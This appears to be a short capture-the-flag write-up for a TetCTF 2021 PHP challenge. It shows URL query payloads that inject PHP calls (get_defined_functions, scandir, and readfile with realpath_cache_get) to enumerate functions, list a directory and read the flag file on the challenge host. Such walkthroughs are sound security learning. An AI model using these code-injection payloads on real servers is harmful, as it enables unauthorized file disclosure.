...
date: "2021-01-02"
description: "TetCTF Writeup"
slug: "tetctf/2021-01-02-hpny"
tags: ["tetctf", "ctf", "writeup", "cybersecurity"]
---

I participated in this capture the flag with a new team called ducks0ci3ty. You may join our discord using the link below.

> [https://discord.gg/ujC3F7zfUw](https://discord.gg/ujC3F7zfUw)
...
![](/media/content/posts/2021/01/02/tetctf-hpny/cipher.png)
...
> [http://192.46.227.32/?roll=var_dump(get_defined_functions())](http://192.46.227.32/?roll=var_dump(get_defined_functions()))

![](/media/content/posts/2021/01/02/tetctf-hpny/madness.png)

So let's clean this one up by looking at the source using `CTRL+U OR CMD+U`

![](/media/content/posts/2021/01/02/tetctf-hpny/clean.png)

There, a lot more legible. Using the same technique, we can read the current directory. 

> [http://192.46.227.32/?roll=var_dump(scandir(getcwd()))/](http://192.46.227.32/?roll=var_dump(scandir(getcwd()))/)
...
> [https://www.php.net/manual/en/function.readfile](https://www.php.net/manual/en/function.readfile)
...
> [https://www.php.net/manual-lookup.php?pattern=path&scope=quickref](https://www.php.net/manual-lookup.php?pattern=path&scope=quickref)
...
> [https://www.php.net/manual/en/function.realpath-cache-get.php](https://www.php.net/manual/en/function.realpath-cache-get.php)

![](/media/content/posts/2021/01/02/tetctf-hpny/array.png)
...
> [https://www.php.net/manual-lookup.php?pattern=arrray&scope=quickref](https://www.php.net/manual-lookup.php?pattern=arrray&scope=quickref)
...
> [http://192.46.227.32/?roll=readfile(end(array_keys(realpath_cache_get())))](http://192.46.227.32/?roll=readfile(end(array_keys(realpath_cache_get()))))

![](/media/content/posts/2021/01/02/tetctf-hpny/flag.png)
